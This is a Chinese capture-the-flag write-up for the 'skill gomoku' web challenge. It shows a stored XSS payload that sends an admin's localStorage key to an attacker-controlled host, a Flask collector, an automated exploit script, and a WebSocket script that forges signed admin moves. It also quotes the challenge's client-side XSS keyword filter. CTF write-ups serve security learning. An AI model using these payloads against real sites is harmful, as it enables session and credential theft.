## 基本信息
- 题目名称：技能五子棋
- 题目链接：[[GCCCTF 2025]技能五子棋 | NSSCTF](https://www.nssctf.cn/problem/7165)
- 考点清单：WebSocket、XSS
### 解题思路
题目给出的初始页面由两个部分组成，一个是五子棋棋盘，另一个评论的功能。下赢五子棋比较困难，主要是因为使用 AI 先手并且没有禁手的规则，黑棋胜率很高。很多在线的五子棋 AI 都比较弱，但是还有更强的 AI 可以辅助我们对战，例如 taptap 中的五子棋（非广告），下赢后会获得下面的提示，告诉我们要使用黑客的方式获胜才能真正获得 flag。
![](images/%E6%8A%80%E8%83%BD%E4%BA%94%E5%AD%90%E6%A3%8B.png)
这里提醒我们在聊天框输入 hint，获得提示："尝试用你的棋子覆盖对面的棋子"。但是想要通过覆盖的方法获胜需要了解棋子传输的方式，进而使用篡改数据包的方法实现覆盖。通过浏览器开发者工具可知，棋子的传输通过 WebSocket 协议，在 `index.js` 中可以看到对应的连接过程。

![](images/%E6%8A%80%E8%83%BD%E4%BA%94%E5%AD%90%E6%A3%8B-1.png)

观察到两种发送 ws 数据包的结构，其中的 ADMIN 方式被编码了，但是编码方式并非 base64。使用随波逐流进行解码可知，该密文解码顺序为 base62 ->base64，解密后的信息为：
```json
ws.send(JSON.stringify({
    packetId: 'move',
    row,
    col,
    auth: 'ADMIN',
    signature: crypto.createHmac('sha256', KEY).update(`move:${row}:${col}`).digest('hex')
}))
```

现在需要获取 key 以计算签名值。注意到 JS 代码中有禁止发送含有特殊关键字的代码：
```js
const prohibitedPattern = /<(script|img|iframe|svg|math|object|embed|link|style|video|audio|source|meta|base|form|input|textarea|button)[^>]*>|on[a-z]+\s*=|javascript:|data:text\/html/i
if (prohibitedPattern.test(message)) {
	alert('消息包含非法内容，请修改后再发送')
	return
}
```
但是测试后可以发现，这个过滤只限制了前端发送，使用 Burpsuite 可以轻松绕过。评论区除了发送还有举报功能，困难还有隐藏界面。使用 dirsearch 对网页进行扫描，可知存在 `/admin/index.html` 管理员审核页面。其中有提示：`当前会话标识admin_key： GCCCTF{LOCAL_ADMIN_KEY_TEST}`，可以知道当前的关键内容是 admin_key，需要通过 XSS 的方式获取。在 `admin.js` 中存在下面的信息：
```js
// 显示当前admin_key
const flagDisplay = document.getElementById('admin-flag-display');
if (flagDisplay) {
	flagDisplay.textContent = localStorage.getItem('admin_key');
}
```
攻击流程如下：发送恶意负载->点击举报按钮->管理员查看->窃取 `admin_key` ->发送含签名的覆盖操作->获取 flag。由此可以编写出下面的 payload：
```js
<img src=x onerror="fetch('http://<IP>:<PORT>/collect?key='+encodeURIComponent(localStorage.getItem('admin_key')))">
```
在一个有公网 IP 的 VPS 的打开对应的端口，使用下面的文件接收 key：
```bash
from flask import Flask, request
app = Flask(__name__)
@app.route('/collect')
def collect():
    key = request.args.get('key', 'No key received')
    print(f"[+] 收到 key: {key}")
    return "OK", 200
    
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```
在日志中接收到 32 位的 key
![](images/%E6%8A%80%E8%83%BD%E4%BA%94%E5%AD%90%E6%A3%8B-2.png)

也可以使用下面的脚本实现一键获取的功能：
```python
#!/usr/bin/env python3
import sys
import threading
import time
import re
import requests
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import unquote

def main():
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} <target_host> <attacker_ip> <attacker_port>")
        sys.exit(1)

    TARGET_HOST, IP, PORT = sys.argv[1], sys.argv[2], int(sys.argv[3])
    BASE_URL = f"http://{TARGET_HOST}"
    COLLECT_URL = f"http://{IP}:{PORT}/collect"
    admin_key = None
    shutdown = threading.Event()

    class H(BaseHTTPRequestHandler):
        def do_GET(self):
            nonlocal admin_key
            if '?' in self.path:
                for param in self.path.split('?',1)[1].split('&'):
                    if '=' in param:
                        try:
                            k, v = param.split('=',1)
                            v = unquote(v)
                            if re.fullmatch(r'[a-fA-F0-9]{32}', v):
                                admin_key = v
                                count = 1
                                print(f"\n[+]admin_key: {admin_key}")
                                shutdown.set()
                        except: pass
            self.send_response(200)
            self.send_header('Content-Type', 'image/gif')
            self.end_headers()
            self.wfile.write(bytes.fromhex('47494638396101000100800000000000ffffff21f90401000000002c00000000010001000002024401003b'))

        def log_message(self, *args): pass

    # 启动HTTP服务器
    server = HTTPServer(('0.0.0.0', PORT), H)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    print(f"[*] Listening on http://{IP}:{PORT}")

    # 发送XSS
    xss = f'<img src=x onerror="fetch(\'{COLLECT_URL}?k=\'+encodeURIComponent(localStorage.getItem(\'admin_key\')))\">'
    try:
        requests.post(f"{BASE_URL}/api/chat", json={"nickname":"x","message":xss}, 
                     headers={"Content-Type":"application/json"}, timeout=10)
        requests.post(f"{BASE_URL}/api/report", headers={"Content-Type":"application/json"}, timeout=10)
        print("[+] XSS sent and bot triggered")
    except Exception as e:
        print(f"[-] Error: {e}")
        return

    # 等待结果
    for _ in range(60):
        if shutdown.is_set():
            server.shutdown()
            return
        time.sleep(1)
    
    print("[-] Timeout: admin_key not received")

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(0)
```

使用下面的脚本, 替换对应的网址和获得的 key 实现覆盖棋子：
```python
import websocket
import json
import hmac
import hashlib
import time
import sys

TARGET_WS_URL = "ws://node1.anna.nssctf.cn:28257/ws"
ADMIN_KEY = "c7b846b1b997f813550589b3da164625"  # 请替换为实际获取的密钥

def generate_signature(admin_key, row, col):
    message = f'move:{row}:{col}'
    return hmac.new(admin_key.encode(), message.encode(), hashlib.sha256).hexdigest()

def send_move(ws, row, col, admin_key):
    sig = generate_signature(admin_key, row, col)
    print(f"[+] Sending move: ({row}, {col}) | Signature: {sig[:32]}...")
    
    payload = {
        "packetId": "move",
        "row": row,
        "col": col,
        "auth": "ADMIN",
        "signature": sig
    }
    ws.send(json.dumps(payload))
    
    while True:
        try:
            ws.settimeout(2.0)
            raw = ws.recv()
            resp = json.loads(raw)
            pkt = resp.get('packetId')
            
            if pkt == 'gameOver':
                print("[+] Game over received!")
                if 'flag' in resp:
                    print(f"[+] FLAG: {resp['flag']}")
                    return True
                else:
                    print("[-] Game over but no flag.")
                    return False
            elif pkt == 'error':
                print(f"[-] Error: {resp.get('message')}")
                return False
            # 忽略 board 等中间消息，继续等待 gameOver
        except:
            break
    return False

def main():
    if len(ADMIN_KEY) != 32:
        print("[-] ERROR: Please set a valid 32-character ADMIN_KEY in the script.")
        sys.exit(1)

    print(f"[+] Connecting to WebSocket: {TARGET_WS_URL}")
    ws = websocket.create_connection(TARGET_WS_URL, timeout=15)
    ws.recv()  # 接收初始棋盘
    print("[+] Connected. Initial board received.")

    moves = [(7, 5), (7, 6), (7, 7), (7, 8), (7, 9)]
    
    for i, (r, c) in enumerate(moves, 1):
        print(f"\n[+] Step {i}/{len(moves)}")
        if (r, c) == (7, 7):
            print("    IMPORTANT: This move will override AI's piece at center!")
        
        if send_move(ws, r, c, ADMIN_KEY):
            ws.close()
            print("\n[+] Attack succeeded! Flag retrieved.")
            return
        
        if i < len(moves):
            time.sleep(0.5)
    
    ws.close()

if __name__ == '__main__':
    main()
```

最终获得 flag
![](images/%E6%8A%80%E8%83%BD%E4%BA%94%E5%AD%90%E6%A3%8B-3.png)